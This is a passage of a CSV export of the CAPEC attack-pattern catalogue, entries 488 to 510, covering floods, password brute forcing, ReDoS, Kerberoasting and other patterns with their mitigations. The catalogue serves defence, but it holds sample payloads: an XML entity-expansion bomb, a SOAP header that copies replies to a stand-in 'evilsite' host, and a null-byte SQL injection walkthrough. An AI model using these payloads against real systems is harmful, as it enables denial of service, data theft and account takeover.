knowledge, experience, and resources to deal with the attack and mitigate it before hand or while it occurs. The best mitigation is preparation before an attack, but there is no bulletproof solution as with ample resources a brute force attack may succeed.::",N/A,::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::,N/A,https://capec.mitre.org/data/definitions/488.html
CAPEC-489,SSL Flood,Standard,Draft,"An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:125::,N/A,::This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.::,N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.::",N/A,::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::,N/A,https://capec.mitre.org/data/definitions/489.html
CAPEC-49,Password Brute Forcing,Standard,Draft,"An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.TECHNIQUE:Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Perform an offline dictionary attack or a rainbow table attack against a known password hash.::",::An adversary needs to know a username to target.::The system uses password based authentication as the one factor authentication mechanism.::An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.::,::SKILL:A brute force attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::,"::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).::",::Many incorrect login attempts are detected by the system.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::","::A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger. An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster.::A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143::",::521::262::263::257::654::307::308::309::,TAXONOMY NAME:ATTACK:ENTRY ID:1110.001:ENTRY NAME:Brute Force:Password Guessing::,N/A,https://capec.mitre.org/data/definitions/49.html
CAPEC-490,Amplification,Standard,Draft,"An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:125::,N/A,::This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.::,N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.::",N/A,::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1498.002:ENTRY NAME:Network Denial of Service:Reflection Amplification::,N/A,https://capec.mitre.org/data/definitions/490.html
CAPEC-491,Quadratic Data Expansion,Detailed,Draft,"An adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory being allocated to fully expand the data. The result of this denial of service could cause the application to freeze or crash. This involves defining a very large entity and using it multiple times in a single entity substitution. CAPEC-197 is a similar attack pattern, but it is easier to discover and defend against. This attack pattern does not perform multi-level substitution and therefore does not obviously appear to consume extensive resources.",::TERM:XML Entity Expansion (XEE):DESCRIPTION:::,N/A,N/A,::NATURE:ChildOf:CAPEC ID:230::,::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using substituion on the victim's side.TECHNIQUE:Use an automated tool to record all instances of URLs to process requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Craft malicious payload] The adversary crafts malicious message containing nested quadratic expansion that completely uses up available server resource.::STEP:3:PHASE:Exploit:DESCRIPTION:[Send the message] Send the malicious crafted message to the target URL.::,::This type of attack requires a server that accepts serialization data which supports substitution and parses the data.::,N/A,N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption Denial of Service::,"::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::",::In this example the attacker defines one large entity and refers to it many times. <?xml version=1.0?><!DOCTYPE bomb [<!ENTITY x AAAAA... [100K of them] ...AAAA>]><b><c>&x;&x;... [100K of them]...&x;&x;</c></b> This results in a relatively small message of 100KBs that will expand to a message in the GB range.::,::770::,N/A,N/A,https://capec.mitre.org/data/definitions/491.html
CAPEC-492,Regular Expression Exponential Blowup,Standard,Draft,An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions.,N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:130::,N/A,"::This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.::",N/A,N/A,N/A,N/A,::Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.::,N/A,::400::1333::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Regular expression Denial of Service - ReDoS::,N/A,https://capec.mitre.org/data/definitions/492.html
CAPEC-493,SOAP Array Blowup,Standard,Draft,"An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:130::,N/A,"::This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.::",N/A,N/A,N/A,N/A,::Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can't be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don't match drop the SOAP packet at the web service layer.::,N/A,::770::,N/A,N/A,https://capec.mitre.org/data/definitions/493.html
CAPEC-494,TCP Fragmentation,Standard,Draft,"An adversary may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules of network controls, by attempting to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:130::,N/A,"::This type of an attack requires the target system to be running a vulnerable implementation of IP, and the adversary needs to ability to send TCP packets of arbitrary size with crafted data.::",N/A,N/A,N/A,N/A,::This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule IF FO=1 and PROTOCOL=TCP then DROP PACKET as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.::,N/A,::770::404::,N/A,N/A,https://capec.mitre.org/data/definitions/494.html
CAPEC-495,UDP Fragmentation,Standard,Draft,An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.,N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:130::,N/A,::This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.::,N/A,N/A,N/A,N/A,::This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.::,N/A,::770::404::,N/A,N/A,https://capec.mitre.org/data/definitions/495.html
CAPEC-496,ICMP Fragmentation,Standard,Draft,An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.,N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:130::,N/A,"::This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.::",N/A,N/A,N/A,N/A,"::This attack may be mitigated through egress filtering based on ICMP payload so a network is a good neighbor to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.::",N/A,::770::404::,N/A,N/A,https://capec.mitre.org/data/definitions/496.html
CAPEC-497,File Discovery,Standard,Draft,"An adversary engages in probing and exploration activities to determine if common key files exists. Such files often contain configuration and security parameters of the targeted application, system or network. Using this knowledge may often pave the way for more damaging attacks.",N/A,High,Very Low,::NATURE:ChildOf:CAPEC ID:169::,N/A,::The adversary must know the location of these common key files.::,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Leverage file protection mechanisms to render these files accessible only to authorized parties.::,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::,N/A,https://capec.mitre.org/data/definitions/497.html
CAPEC-5,Blue Boxing,Detailed,Draft,"This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.",N/A,Medium,Very High,::NATURE:ChildOf:CAPEC ID:220::,N/A,::System must use weak authentication mechanisms for administrative functions.::,"::SKILL:Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades.:LEVEL:Low::","::CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch::",N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Implementation: Upgrade phone lines. Note this may be prohibitively expensive::Use strong access control such as two factor access control for administrative access to the switch::,"::An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available.::",::285::,N/A,N/A,https://capec.mitre.org/data/definitions/5.html
CAPEC-50,Password Recovery Exploitation,Standard,Draft,An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:212::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::,"::STEP:1:PHASE:Explore:DESCRIPTION:Understand the password recovery mechanism and how it works.::STEP:2:PHASE:Exploit:DESCRIPTION:Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.::",::The system allows users to recover their passwords and gain access back into the system.::Password recovery mechanism has been designed or implemented insecurely.::Password recovery mechanism relies only on something the user knows and not something the user has.::No third party intervention is required to use the password recovery mechanism.::,::SKILL:Brute force attack:LEVEL:Low::SKILL:Social engineering and more sophisticated technical attacks.:LEVEL:Medium::,"::For a brute force attack one would need a machine with sufficient CPU, RAM and HD.::",::Many incorrect attempts to answer the security question.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.::E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.::Ensure that your password recovery functionality is not vulnerable to an injection style attack.::,"::An attacker clicks on the forgot password and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.::phpBanner Exchange is a PHP script (using the mySQL database) that facilitates the running of a banner exchange without extensive knowledge of PHP or mySQL. A SQL injection was discovered in the password recovery module of the system that allows recovering an arbitrary user's password and taking over their account. The problem is due to faulty input sanitization in the phpBannerExchange, specifically the e-mail address of the user which is requested by the password recovery module. The e-mail address requested by the password recovery module on the resetpw.php page. That e-mail address is validated with the following regular expression: if(!eregi(^[_a-z0-9-]+(.[_a-z0-9-]+)*@[a-z0-9-]+(.[a-z0-9-]+)*(.[a-z]{2,3})$, $email)){ A bug in the implementation of eregi() allows to pass additional character using a null byte 0. Since eregi() is implemented in C, the variable $email is treated as a zero-terminated string. All characters following the Null Byte will not be recognized by the regular expression. So an e-mail address can be provided that includes the special character ' to break the SQL query below (and it will not be rejected by the regular expression because of the null byte trick). So a SQL injection becomes possible: $get_info=mysql_query(select * from banneruser whereemail='$email' ); This query will return a non-zero result set even though the email supplied (attacker's email) is not in the database. Then a new password for the user is generated and sent to the $email address, an e-mail address controlled by the attacker. An attacker can then log in into the system.See also: CVE-2006-3013::",::522::640::,N/A,N/A,https://capec.mitre.org/data/definitions/50.html
CAPEC-502,Intent Spoof,Standard,Draft,"An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component trusts the intent's action without verififcation, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:148::,N/A,::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.::,N/A,N/A,N/A,N/A,"::To limit one's exposure to this type of attack, developers should avoid exporting components unless the component is specifically designed to handle requests from untrusted applications. Developers should be aware that declaring an intent filter will automatically export the component, exposing it to public access. Critical, state-changing actions should not be placed in exported components. If a single component handles both inter- and intra-application requests, the developer should consider dividing that component into separate components. If a component must be exported (e.g., to receive system broadcasts), then the component should dynamically check the caller's identity prior to performing any operations. Requiring Signature or SignatureOrSystem permissions is an effective way of limiting a component's exposure to a set of trusted applications. Finally, the return values of exported components can also leak private data, so developers should check the caller's identity prior to returning sensitive values.::",N/A,::284::,N/A,N/A,https://capec.mitre.org/data/definitions/502.html
CAPEC-503,WebView Exposure,Standard,Draft,"An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:122::,N/A,"::This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.::",N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, an application should limit permissions to only those required and should verify the origin of all web content it loads.::",N/A,::284::,N/A,N/A,https://capec.mitre.org/data/definitions/503.html
CAPEC-504,Task Impersonation,Standard,Stable,"An adversary, through a previously installed malicious application, impersonates an expected or routine task in an attempt to steal sensitive information or leverage a user's privileges.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:173::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing sensitive information.TECHNIQUE:Determine what tasks prompt a user for their credentials.:TECHNIQUE:Determine what tasks may prompt a user to authorize a process to execute with elevated privileges.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials or to ride the user's privileges.TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.:TECHNIQUE:Prompt a user to authorize a task to run with elevated privileges, while making the user believe the request is legitimate.::",::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::The user's privileges allow them to execute certain tasks with elevated privileges.::,"::SKILL:Once an adversary has gained access to the target system, impersonating a task is trivial.:LEVEL:Low::",::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate task.::,::Credential or permission elevation prompts that appear illegitimate or unexpected.::,::SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::,"::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::","::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges.::",::1021::,N/A,N/A,https://capec.mitre.org/data/definitions/504.html
CAPEC-506,Tapjacking,Standard,Draft,"An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces them to tap on an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:173::,N/A,::This pattern of attack requires the ability to execute a malicious application on the user's device. This malicious application is used to present the interface to the user and make the attack possible.::,N/A,N/A,N/A,N/A,N/A,N/A,::1021::,N/A,N/A,https://capec.mitre.org/data/definitions/506.html
CAPEC-508,Shoulder Surfing,Detailed,Draft,"In a shoulder surfing attack, an adversary observes an unaware individual's keystrokes, screen content, or conversations with the goal of obtaining sensitive information. One motive for this attack is to obtain sensitive information about the target for financial, personal, political, or other gains. From an insider threat perspective, an additional motive could be to obtain system/application credentials or cryptographic keys. Shoulder surfing attacks are accomplished by observing the content over the victim's shoulder, as implied by the name of this attack.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:651::NATURE:CanPrecede:CAPEC ID:560::,N/A,"::The adversary typically requires physical proximity to the target's environment, in order to observe their screen or conversation. This may not be the case if the adversary is able to record the target and obtain sensitive information upon review of the recording.::","::SKILL:In most cases, an adversary can simply observe and retain the desired information.:LEVEL:Low::",N/A,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:LIKELIHOOD:
               Confidentiality
               Read Data
               High
            ::","::Be mindful of your surroundings when discussing or viewing sensitive information in public areas.::Pertaining to insider threats, ensure that sensitive information is not displayed to nor discussed around individuals without need-to-know access to said information.::","::An adversary can capture a target's banking credentials and transfer money to adversary-controlled accounts.::An adversary observes the target's mobile device lock screen pattern/passcode and then steals the device, which can now be unlocked.::An insider could obtain database credentials for an application and sell the credentials on the black market.::An insider overhears a conversation pertaining to classified information, which could then be posted on an anonymous online forum.::",::200::359::,N/A,N/A,https://capec.mitre.org/data/definitions/508.html
CAPEC-509,Kerberoasting,Detailed,Stable,"Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::,"::STEP:1:PHASE:Explore:DESCRIPTION:Scan for user accounts with set SPN valuesTECHNIQUE:These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means.::STEP:2:PHASE:Explore:DESCRIPTION:Request service ticketsTECHNIQUE:Using user account's SPN value, request other service tickets from Active Directory::STEP:3:PHASE:Experiment:DESCRIPTION:Extract ticket and save to diskTECHNIQUE:Certain tools like Mimikatz can extract local tickets and save them to memory/disk.::STEP:4:PHASE:Exploit:DESCRIPTION:Crack the encrypted ticket to harvest plain text credentialsTECHNIQUE:Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.::","::The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.::The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).::The adversary requires a brute force tool.::",::SKILL::LEVEL:Medium::,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Gain Privileges::,"::Monitor system and domain logs for abnormal access.::Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.::Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.::Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.::",::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::,::522::308::309::294::263::262::521::,TAXONOMY NAME:ATTACK:ENTRY ID:1558.003:ENTRY NAME:Steal or Forge Kerberos Tickets:Kerberoasting::,N/A,https://capec.mitre.org/data/definitions/509.html
CAPEC-51,Poison Web Service Registry,Detailed,Draft,"SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:203::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.TECHNIQUE:An adversary can perform a denial of service attack on a web service.:TECHNIQUE:An adversary can redirect requests or responses to a malicious service.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.TECHNIQUE:Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.:TECHNIQUE:Create a service that will give malicious responses to a service provider.:TECHNIQUE:Act as a malicious service provider and respond to requests in an arbitrary way.::STEP:4:PHASE:Exploit:DESCRIPTION:[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.TECHNIQUE:Intercept and change WS-Adressing headers to route to a malicious service or service provider.:TECHNIQUE:Provide incorrect information in schema or metadata to cause a denial of service.:TECHNIQUE:Delete information about service procider interfaces to cause a denial of service.::",::The attacker must be able to write to resources or redirect access to the service registry.::,::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::,::Capability to directly or indirectly modify registry resources::,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Design: Enforce principle of least privilege::Design: Harden registry server and file access permissions::Implementation: Implement communications to and from the registry using secure protocols::,"::WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header><wsa:MessageID>http://example.com/Message </wsa:MessageID><wsa:ReplyTo><wsa:Address>http://valid.example/validClient</wsa:Address> </wsa:ReplyTo><wsa:ReplyTo><wsa:Address>http://evilsite/evilClient</wsa:Address> </wsa:ReplyTo><wsa:FaultTo><wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address> </wsa:FaultTo> </S:Header> In this example evilsite is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.::",::285::74::693::,N/A,N/A,https://capec.mitre.org/data/definitions/51.html
CAPEC-510,SaaS User Request Forgery,Standard,Draft,"An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user's session. This attack is executed after a trusted user is authenticated into a cloud service, piggy-backing on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user's privilege level.",N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:21::,N/A,::An adversary must be able install a purpose built malicious application onto the trusted user's system and convince the user to execute it while authenticated to the SaaS application.::,::SKILL:This attack pattern often requires the technical ability to modify a malicious software package (e.g. Zeus) to spider a targeted site and a way to trick a user into a malicious software download.:LEVEL:Medium::,N/A,N/A,N/A,"::To limit one's exposure to this type of attack, tunnel communications through a secure proxy service.::Detection of this type of attack can be done through heuristic analysis of behavioral anomalies (a la credit card fraud detection) which can be used to identify inhuman behavioral patterns. (e.g., spidering)::",N/A,::346::,N/A,"TYPE:Other:NOTE:SaaS/Cloud applications are often accessed from unmanaged systems and devices, over untrusted networks that are outside corporate IT control. The likelihood of a cloud service being accessed by a trusted user though an untrusted device is high. Several instances of this style of attack have been found.::",https://capec.mitre.org/data/definitions/510.html
